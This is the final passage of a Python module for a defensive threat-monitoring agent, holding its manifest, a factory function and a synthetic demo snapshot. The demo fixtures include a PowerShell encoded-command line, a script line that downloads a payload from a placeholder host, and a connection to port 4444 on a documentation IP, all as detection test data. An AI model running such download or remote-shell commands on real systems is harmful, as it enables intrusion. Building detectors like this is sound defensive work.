            "class_name": self.__class__.__name__,
            "version": self.version,
            "file_path": "agents/security_agent/threat_monitor.py",
            "description": (
                "Detects suspicious processes, scripts, downloads, browser "
                "extensions, DNS activity, and network behavior."
            ),
            "capabilities": [
                "security.threat_monitor.monitor",
                "security.threat_monitor.analyze_snapshot",
                "security.threat_monitor.scan_processes",
                "security.threat_monitor.scan_scripts",
                "security.threat_monitor.scan_downloads",
                "security.threat_monitor.scan_browser_extensions",
                "security.threat_monitor.scan_network_behavior",
                "security.threat_monitor.collect_live_snapshot",
                "security.threat_monitor.summarize_findings",
            ],
            "public_methods": [
                "run",
                "monitor",
                "analyze_snapshot",
                "scan_processes",
                "scan_scripts",
                "scan_downloads",
                "scan_browser_extensions",
                "scan_network_behavior",
                "collect_live_snapshot",
                "summarize_findings",
                "get_agent_manifest",
            ],
            "required_context": [
                "user_id",
                "workspace_id",
            ],
            "sensitive_operations": [
                "collect_live_snapshot",
            ],
            "security_approval_required_for": [
                "live process collection",
                "live command-line collection",
                "live network connection collection",
                "browser profile collection",
                "download directory collection",
            ],
            "destructive_actions": [],
            "safe_to_import": True,
            "optional_dependencies": [
                "psutil",
            ],
            "integrations": {
                "master_agent": True,
                "security_agent": True,
                "verification_agent": True,
                "memory_agent": True,
                "agent_registry": True,
                "agent_loader": True,
                "agent_router": True,
                "dashboard_api": True,
                "audit_logger": True,
                "policy_engine": True,
                "emergency_lock": True,
            },
        }


# =============================================================================
# Factory and standalone test helper
# =============================================================================

def create_threat_monitor(
    config: Optional[
        Union[ThreatMonitorConfig, Mapping[str, Any]]
    ] = None,
    **kwargs: Any,
) -> ThreatMonitor:
    """Create a configured ThreatMonitor instance."""
    return ThreatMonitor(
        config=config,
        **kwargs,
    )


async def _standalone_demo() -> Dict[str, Any]:
    """
    Run a safe, synthetic demonstration.

    No live telemetry is collected and no system action is performed.
    """
    monitor = create_threat_monitor(
        {
            "hash_sensitive_values": False,
            "redact_command_lines": False,
            "redact_urls": False,
        }
    )

    snapshot = {
        "source": "synthetic_test",
        "processes": [
            {
                "pid": 1001,
                "ppid": 200,
                "name": "powershell.exe",
                "exe": "C:\\Users\\Demo\\AppData\\Local\\Temp\\powershell.exe",
                "command_line": (
                    "powershell.exe -EncodedCommand "
                    "VwByAGkAdABlAC0ASABvAHMAdAA="
                ),
                "cpu_percent": 4.0,
                "memory_percent": 1.0,
            },
            {
                "pid": 200,
                "ppid": 1,
                "name": "winword.exe",
                "exe": "C:\\Program Files\\Microsoft Office\\winword.exe",
            },
        ],
        "scripts": [
            {
                "script_id": "script-1",
                "name": "update.ps1",
                "path": "C:\\Users\\Demo\\Downloads\\update.ps1",
                "content": (
                    "$x = New-Object Net.WebClient; "
                    "$x.DownloadString('https://example.invalid/payload')"
                ),
            }
        ],
        "downloads": [
            {
                "download_id": "download-1",
                "filename": "invoice.pdf.exe",
                "path": "C:\\Users\\Demo\\Downloads\\invoice.pdf.exe",
                "url": "https://sample-domain.example/invoice.pdf.exe",
                "signed": False,
                "reputation": "unknown",
            }
        ],
        "browser_extensions": [
            {
                "extension_id": "example-extension-id",
                "name": "Free VPN Proxy",
                "version": "1.0.0",
                "browser": "Chrome",
                "install_source": "sideloaded",
                "permissions": [
                    "proxy",
                    "webRequest",
                    "webRequestBlocking",
                    "cookies",
                    "history",
                    "<all_urls>",
                ],
            }
        ],
        "network_connections": [
            {
                "connection_id": "connection-1",
                "pid": 1001,
                "process_name": "powershell.exe",
                "remote_address": "203.0.113.10",
                "remote_port": 4444,
                "protocol": "tcp",
                "status": "established",
            }
        ],
        "dns_events": [
            {
                "pid": 1001,
                "process_name": "powershell.exe",
                "domain": "random-example.duckdns.org",
                "response_ip": "203.0.113.10",
            }
        ],
    }

    return await monitor.analyze_snapshot(
        user_id="demo-user",
        workspace_id="demo-workspace",
        snapshot=snapshot,
    )


__all__ = [
    "ThreatMonitor",
    "ThreatMonitorConfig",
    "ThreatFinding",
    "ThreatSnapshot",
    "ThreatSeverity",
    "ThreatCategory",
    "MonitorMode",
    "FindingStatus",
    "create_threat_monitor",
]


if __name__ == "__main__":
    demo_result = asyncio.run(_standalone_demo())
    print(
        json.dumps(
            demo_result,
            indent=2,
            ensure_ascii=False,
        )
    )